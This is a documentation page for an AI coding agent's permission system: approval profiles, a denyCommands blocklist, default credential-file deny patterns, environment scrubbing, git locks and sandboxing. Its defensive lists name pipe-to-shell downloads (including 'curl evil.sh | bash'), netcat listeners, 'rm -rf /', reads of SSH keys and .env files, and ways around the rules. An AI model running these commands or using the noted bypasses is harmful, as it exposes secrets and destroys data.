# Permission Profiles

Intelligent permission filtering based on command safety analysis.

## Overview

SC CLI offers two permission profiles:

1. **Traditional** - Ask for every tool use (default)
2. **Blacklist** - Only ask for dangerous commands (smart mode)

Switch between profiles with `/profile` command.

---

## Quick Comparison

| Feature | Traditional | Blacklist |
|---------|-------------|-----------|
| Safe commands | Ask | Auto-approve |
| Dangerous commands | Ask | Ask with warning |
| File reads | Ask | Auto-approve |
| Simple shell | Ask | Auto-approve |
| `rm -rf` | Ask | **Block with alert** |
| `sudo` commands | Ask | **Block with alert** |
| Best for | New users, high security | Power users, productivity |

---

## Traditional Profile

**Default behavior** - Ask permission for every tool use.

### How it works:
1. Agent wants to use a tool
2. You get a permission prompt
3. You approve or deny
4. Can configure auto-approve with `/pre-approved-commands`

### Example:
```
🔐 Permission required: run_shell
   Args: {"command": "ls -la"}

? Allow this action?
❯   Yes (once)
    Always (save to config)
    Session (until exit)
    No (deny)
```

### When to use:
- ✅ Learning what the agent does
- ✅ Maximum control
- ✅ Sensitive environments
- ✅ Reviewing every action

---

## Blacklist Profile (Smart Mode)

**Intelligent filtering** - Only ask for dangerous commands.

### How it works:
1. Agent wants to run a command
2. System analyzes command safety
3. **Safe** → Auto-approve silently
4. **Dangerous** → Show detailed warning

### Dangerous Command Categories:

#### 🔴 CRITICAL
- **File deletion**: `rm`, `del`, `Remove-Item`, `unlink`
- **Recursive deletion**: `rm -rf`, `rd /s`
- **Privilege escalation**: `sudo`, `su`, `runas`
- **Disk operations**: `mkfs`, `dd`, `format`, `fdisk`
- **System file overwrite**: `> /etc/`, `> /boot/`, `> C:\Windows\`

#### 🟠 HIGH
- **Network execution**: `curl ... | bash`, `wget ... | sh`
- **Network backdoors**: `nc -l`, `netcat`
- **Firewall changes**: `iptables`, `netsh`
- **Permission changes**: `chmod 777`, `chown`
- **Service control**: `systemctl`, `service`
- **Database deletion**: `DROP TABLE`, `TRUNCATE`, `DELETE FROM ... WHERE 1=1`

#### 🟡 MEDIUM
- **Package removal**: `apt-get remove`, `npm uninstall`
- **Process kill**: `kill -9`, `killall`, `taskkill /f`
- **Git force operations**: `git push -f`, `git reset --hard`, `git clean -df`

### Example (Safe Command):
```
You: list all files

🤖 Agent runs: ls -la
[Auto-approved - no prompt]
```

### Example (Dangerous Command):
```
You: clean up old files

  ┌─ Dangerous Command Alert ──────────────────────────────┐
  │ ⚠️  Tool: run_shell
  │    Command: rm -rf /tmp/old_files
  │
  │    ⚠️  Dangerous command detected (critical):
  │       • Recursive delete (rm -rf)
  │       • Delete files/directories
  └─────────────────────────────────────────────────────────┘

? This command is potentially dangerous. Allow anyway? (y/N)
```

### When to use:
- ✅ Power users who know what they're doing
- ✅ Development workflows
- ✅ Want speed without sacrificing safety
- ✅ Trust agent for safe operations

---

## Switching Profiles

### Command Line:
```
You: /profile

? Select permission profile:
❯ Traditional (current) - Ask for every tool use
  Blacklist - Only ask for dangerous commands
```

### What happens:
1. Choice is saved to `~/.sc-agent/config.json`
2. Takes effect immediately
3. Persists across sessions

---

## Detailed Examples

### Scenario 1: Development Workflow (Blacklist Mode)

```
You: /profile
[Select: Blacklist]

✓ Permission profile: Blacklist
   Only dangerous commands will require permission

You: run the tests and fix any linting issues

[Agent executes:]
npm test          ✅ Auto-approved (safe)
npm run lint      ✅ Auto-approved (safe)
git diff          ✅ Auto-approved (safe)
git add .         ✅ Auto-approved (safe)

[Agent wants to run:]
git push -f origin main

  ┌─ Dangerous Command Alert ──────────────────────────────┐
  │ ⚠️  Command: git push -f origin main
  │
  │    ⚠️  Dangerous command detected (medium):
  │       • Force push (can overwrite remote)
  └─────────────────────────────────────────────────────────┘

? This command is potentially dangerous. Allow anyway? › No

[Agent tries alternative:]
git push origin main  ✅ Auto-approved (safe)
```

**Result:** 5 safe commands auto-approved, 1 dangerous blocked and replaced with safe alternative.

---

### Scenario 2: Code Review (Traditional Mode)

```
You: /profile
[Select: Traditional]

✓ Permission profile: Traditional
   You will be asked for permission for every tool use

You: analyze this codebase and suggest improvements

🔐 Permission required: list_dir
   Args: {"path": "."}
√ Allow this action? ... Session (until exit)

🔐 Permission required: read_file
   Args: {"path": "src/index.ts"}
√ Allow this action? ... Session (until exit)

[Every tool prompts - full control]
```

**Result:** Complete visibility into every action.

```

---

## Configuration

### Config File Location
`~/.sc-agent/config.json`

### Example Configuration

**Traditional Mode:**
```json
{
  "permissions": {
    "profile": "traditional",
    "autoApprove": ["read_file", "list_dir"]
  }
}
```

**Blacklist Mode:**
```json
{
  "permissions": {
    "profile": "blacklist"
  }
}
```

---

## Combining with Other Features

### Blacklist + Auto-Approve
```
/profile → Blacklist
/pre-approved-commands → Configure additional auto-approves
```

Result:
- Dangerous commands → Ask with warning
- Safe commands → Auto-approve
- Read-only tools → Auto-approve (if configured)

### Traditional + Permission Modes
```
/profile → Traditional
/permissions → Ask once per tool
```

Result:
- Every tool prompts once
- Session memory for repeats
- Full control

---

## Tips

### Start with Blacklist
Most users should use **Blacklist** mode:
- Productivity boost
- Still catches dangerous operations
- Learn what's dangerous

### Use Traditional for Audit
When you need to see everything:
- Security audits
- Learning workflows
- Production environments

### Review Dangerous Commands
Check what's blocked:
```
You: /info

Permission Profile: Blacklist (smart)
```

### Customize Blacklist
Currently blacklist is hardcoded. Future versions will support custom patterns.

---

## Hard Deny List: `denyCommands`

Independent of any profile or auto-approve flag, `permissions.denyCommands` is a **non-interactive blocklist** for `run_shell`. Matching commands are rejected with an error before execution — even under `-y`, `autoApprove`, or the Blacklist profile.

```json
{
  "permissions": {
    "autoApprove": ["run_shell"],
    "denyCommands": [
      "git push --force",
      "gh pr merge",
      "rm -rf /",
      "curl * | *sh"
    ]
  }
}
```

### Pattern semantics

- Case-sensitive; whitespace is normalized on both sides.
- **Substring match** (default): `"git push"` blocks `git push`, `git push origin main`, `sudo git push`, etc.
- **Glob match** (contains `*`): the `*` matches any character sequence and the pattern must match the **entire** command. `"curl * | *sh"` blocks `curl evil.sh | bash` but not `sudo curl evil.sh | bash` — widen with `"*curl * | *sh*"` if needed.

When a command is denied, the agent receives an error naming the matched rule so it can choose a different approach — there is no interactive prompt for denied commands.

Typical uses: preventing pushes/merges in agent-driven workers, blocking destructive filesystem commands, and stopping shell-pipe-to-interpreter patterns.

### Shipped defaults: credential-file reads (#471)

The built-in config seeds `denyCommands` with patterns that block the common file-dump verbs over credential material — the shell-side counterpart of the default `denyPaths`:

- `cat|head|tail|more|less|bat *.env*` and `cat .env`
- `cat|head|tail *.ssh/*` and `cat *id_rsa* / *id_ed25519* / *id_ecdsa* / *id_dsa*`
- `cat *.key`, `cat *.pem`
- `cat` of `*.netrc`, `*.npmrc`, `*.aws/credentials`, `*.kube/config`, `*.docker/config.json`, `*.pgpass`, `*.git-credentials`
- any command mentioning `.sc-agent/config.json` (the agent's own credential store)
- `source *.env*` / `. *.env*` — sourcing re-injects secrets into the child shell env
- `*proc*environ` — `/proc/<pid>/environ` would dump the *parent* process env regardless of child-env scrubbing

Two important caveats:

- **These are defaults, not built-ins.** A `denyCommands` list in your config replaces them wholesale — keep or copy these entries when you override.
- **They are best-effort, not a boundary.** An obfuscated command, a reader that isn't listed (`sudo cat`, `python -c`, `cp`), or a differently-named secret file slips past them. The hard guarantees live in the child-environment scrub and `sandbox.*` below — deny rules are tripwires, not walls.

### `run_shell` child environment (#471)

Every `run_shell` command spawns with an **allowlisted environment** — never the agent's `process.env`: PATH, HOME, SHELL, TERM, USER, locale/tmp/XDG, proxy vars, and the Windows basics (SYSTEMROOT, COMSPEC, PATHEXT, …). Credential-shaped names — `SC_*`, `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_KEY*`, `*_PASSWORD`, `*_AUTH`, `*_CREDENTIALS`, `BEARER` — are stripped **unconditionally**, so `env`/`printenv` inside a spawned command cannot expose provider keys.

```json
{ "run_shell": { "allowedEnvVars": ["NPM_CONFIG_REGISTRY", "CARGO_TERM_COLOR"] } }
```

`run_shell.allowedEnvVars` extends the base set **by name** — values still come from your environment, and credential-shaped names are ignored even if listed. Tool output is additionally masked for *known* secret values (credential env vars + configured API keys are replaced with `***`) before it enters the model context.

> **`permissions.denyPaths` does not constrain `run_shell`.** It guards the file tools (`read_file`, `write_file`, `edit_file`, `list_dir`, `search_text`) only — the shell has no path layer. Shell-side protection is the env scrub + `denyCommands` + output redaction; enable `sandbox.*` when you need a hard filesystem boundary.

---

## Git Mutation Lock: `denyGitMutation` / `--no-commit`

For orchestrators that own git state externally (ai-sdlc workers, Hermes), `permissions.denyGitMutation` is a **non-interactive hard block** on every git-mutating operation — applied in every permission mode, including `-y`/`autoApprove`.

```json
{ "permissions": { "denyGitMutation": true } }
```

Or per invocation: `scc chat -yq --no-commit 'implement issue #42'`.

**Blocked:** `git` tool `add`/`commit` operations; `run_shell` invocations of `git add|commit|push|pull|checkout|switch|restore|reset|rebase|merge|cherry-pick|revert|stash|tag <args>|branch <args>|clone|init|fetch|clean|mv|rm|am|apply|submodule|worktree` (including inside `cd x && git …` chains).

**Still allowed:** read-only git (`status`, `diff`, `log`, `show`, `git branch`/`git tag` with no extra args) and all non-git tools — the model stays in edit-only mode.

Denied calls return a clear "git is managed externally" error so the model proceeds without retrying git operations.

---

## Tool-Call Sandboxing (`sandbox.*`)

Independent of permission profiles, the optional `sandbox` config block wraps every `run_shell` command in a boundary (filesystem scope, network egress allowlist, optional seccomp). It composes **additively** with the controls above — deny always wins:

- `denyCommands` still rejects matching commands before the sandbox even spawns them.
- Literal `denyPaths` are masked *inside* the sandbox mount namespace (tmpfs over dirs, `/dev/null` over files); glob deny entries keep working via `resolveSafePath`.
- `sandbox.writablePaths`/`readOnlyPaths` can widen the fs boundary, but cannot un-deny a `denyPaths` entry.
- Non-allowlisted egress is rejected by a loopback proxy and logged as a `sandbox_violation` (`{rule, target}`) — surfaced as a structured tool error, in the audit log, and in the run manifest.

```json
{
  "sandbox": {
    "enabled": true,
    "egressAllowlist": ["api.github.com:443"],
    "writablePaths": ["cache"],
    "seccomp": true
  }
}
```

See [sandboxing.md](sandboxing.md) for the full profile schema and backend matrix.
## Unattended Git Guard (`-y` / `--permissions unlimited`)

In unattended runs the dedicated `git` tool owns repo state: `run_shell` refuses **every** git-mutating command — `git checkout --`, `git restore`, `git reset --hard`, `git clean -f`, `git stash`, plus `add`/`commit`/`push`/`pull`/`rebase`/`merge`/`cherry-pick`/`revert`/`tag <args>`/`branch <args>`/`clone`/`init`/`fetch`/`mv`/`rm`/`am`/`apply`/`submodule`/`worktree`/`switch`/`checkout` (including inside `cd x && git …` chains). The refusal error is routed back to the model and steers it to the `git` tool for supported operations (`status`, `diff`, `log`, `show`, `branch`, `add`, `commit`, `format`).

Why: an unattended model that runs `git checkout -- .`/`git restore`/`git reset --hard`/`git clean`/`git stash` can silently revert its own edits before the wrapper commits — the run reports success against a clean tree. Read-only git (`status`, `diff`, `log`, `show`, bare `branch`/`tag`) and all non-git commands stay allowed. Interactive mode is unaffected — the human approves each command.

To block git mutations in **every** mode (orchestrators that own git state externally), use `denyGitMutation` / `--no-commit` above — it additionally disables the `git` tool's `add`/`commit`.

## Troubleshooting

### Too many prompts in Blacklist mode

**Problem:** Still getting many permission requests

**Solution:** You might have Traditional mode active

```
You: /info
[Check Profile line]

You: /profile
[Select: Blacklist]
```

### Safe command blocked

**Problem:** A safe command triggered warning

**Solution:** Report this! The blacklist might be too aggressive.

```
# Workaround: approve and continue
# Please report: github.com/your-repo/issues
```

### Dangerous command not caught

**Problem:** A dangerous command auto-approved

**Solution:** Blacklist doesn't catch everything. Use Traditional mode for maximum safety.
